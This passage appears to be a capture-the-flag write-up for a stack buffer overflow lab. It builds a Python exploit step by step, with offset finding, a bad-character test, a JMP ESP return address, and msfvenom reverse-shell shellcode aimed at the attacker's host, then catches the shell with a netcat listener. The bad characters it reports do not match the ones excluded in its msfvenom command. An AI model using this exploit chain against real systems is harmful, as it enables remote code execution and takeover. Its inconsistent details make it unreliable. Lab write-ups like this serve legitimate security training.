	print (ip+":"+str(port))

	prefix = "OVERFLOW10 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 537.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 600
```

<figure><img src="../../.gitbook/assets/image (24) (4).png" alt=""><figcaption></figcaption></figure>

**exploit.py - Code Changes #2**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW10 "
	offset = 537
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (2) (6) (1).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\xa0\xad\xbe\xde\xef

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#Bad Chars found: \x00\xa0\xad\xbe\xde\xef
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW10 "
	offset = 537
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

<figure><img src="../../.gitbook/assets/image (14) (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (26) (2).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (6) (5) (1).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW10 "
	offset = 537
	overflow = "A" * offset
	retn = "\xaf\x11\x50\x62"
	padding = "\x90" * 16
	payload = ( "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x66\x70\x6a\x8f\x83\xee\xfc\xe2\xf4\x9a\x98\xe8\x8f\x66\x70"
"\x0a\x06\x83\x41\xaa\xeb\xed\x20\x5a\x04\x34\x7c\xe1\xdd\x72"
"\xfb\x18\xa7\x69\xc7\x20\xa9\x57\x8f\xc6\xb3\x07\x0c\x68\xa3"
"\x46\xb1\xa5\x82\x67\xb7\x88\x7d\x34\x27\xe1\xdd\x76\xfb\x20"
"\xb3\xed\x3c\x7b\xf7\x85\x38\x6b\x5e\x37\xfb\x33\xaf\x67\xa3"
"\xe1\xc6\x7e\x93\x50\xc6\xed\x44\xe1\x8e\xb0\x41\x95\x23\xa7"
"\xbf\x67\x8e\xa1\x48\x8a\xfa\x90\x73\x17\x77\x5d\x0d\x4e\xfa"
"\x82\x28\xe1\xd7\x42\x71\xb9\xe9\xed\x7c\x21\x04\x3e\x6c\x6b"
"\x5c\xed\x74\xe1\x8e\xb6\xf9\x2e\xab\x42\x2b\x31\xee\x3f\x2a"
"\x3b\x70\x86\x2f\x35\xd5\xed\x62\x81\x02\x3b\x18\x59\xbd\x66"
"\x70\x02\xf8\x15\x42\x35\xdb\x0e\x3c\x1d\xa9\x61\x8f\xbf\x37"
"\xf6\x71\x6a\x8f\x4f\xb4\x3e\xdf\x0e\x59\xea\xe4\x66\x8f\xbf"
"\xdf\x36\x20\x3a\xcf\x36\x30\x3a\xe7\x8c\x7f\xb5\x6f\x99\xa5"
"\xfd\xe5\x63\x18\x60\x85\x86\xa9\x02\x8d\x66\x61\x36\x06\x80"
"\x1a\x7a\xd9\x31\x18\xf3\x2a\x12\x11\x95\x5a\xe3\xb0\x1e\x83"
"\x99\x3e\x62\xfa\x8a\x18\x9a\x3a\xc4\x26\x95\x5a\x0e\x13\x07"
"\xeb\x66\xf9\x89\xd8\x31\x27\x5b\x79\x0c\x62\x33\xd9\x84\x8d"
"\x0c\x48\x22\x54\x56\x8e\x67\xfd\x2e\xab\x76\xb6\x6a\xcb\x32"
"\x20\x3c\xd9\x30\x36\x3c\xc1\x30\x26\x39\xd9\x0e\x09\xa6\xb0"
"\xe0\x8f\xbf\x06\x86\x3e\x3c\xc9\x99\x40\x02\x87\xe1\x6d\x0a"
"\x70\xb3\xcb\x8a\x92\x4c\x7a\x02\x29\xf3\xcd\xf7\x70\xb3\x4c"
"\x6c\xf3\x6c\xf0\x91\x6f\x13\x75\xd1\xc8\x75\x02\x05\xe5\x66"
"\x23\x95\x5a"
		)
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

